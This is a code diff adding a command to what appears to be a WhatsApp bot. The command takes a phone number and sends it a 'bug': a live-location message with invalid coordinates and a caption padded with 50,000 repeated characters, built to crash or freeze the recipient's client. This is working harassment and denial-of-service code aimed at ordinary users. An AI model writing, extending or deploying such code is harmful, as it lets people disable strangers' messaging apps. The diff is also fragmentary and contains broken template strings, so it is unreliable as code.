@@ -3,6 +3,27 @@ const config = require('../config')
 const { cmd, commands } = require('../command')
 
 cmd({
+    pattern: "fuck",
+    react: "💥",
+    desc: "Send a series of operations to a target number.",
+    category: "utilities",
+    use: ".fuck <phone_number>",
+    filename: __filename
+}, async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
+    try {
+        if (!isOwner) {
+            return reply("❌ This command is for premium users only.");
+        }
+        if (!q) {
+            return reply(`\`Example:\` : ${prefix + command} 628×××`);
+        }
+        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+        reply(`✔️ Bug sent successfully to{target}. *Please wait for at least 5 minutes before trying again.*`);
+        
+async function ngeloc(target, quoted) {
+    try {
+        const liveLocationMessage = {
+            "liveLocationMessage": {
                 "degreesLatitude": "p", 
                 "degreesLongitude": "p", 
                 "caption": `𝐒𝐔𝐋𝐀-𝐌𝐃` + "ꦾ".repeat(50000),
@@ -43,7 +64,7 @@ async function func1(target) {
             nativeFlowMessage: {},
             contextInfo: {
                 mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
-                groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝐒𝐔𝐋𝐀-𝐌𝐃 " }]
+                groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝗨𝗗𝗠𝗢𝗗𝗭 " }]
             }
         }
     };
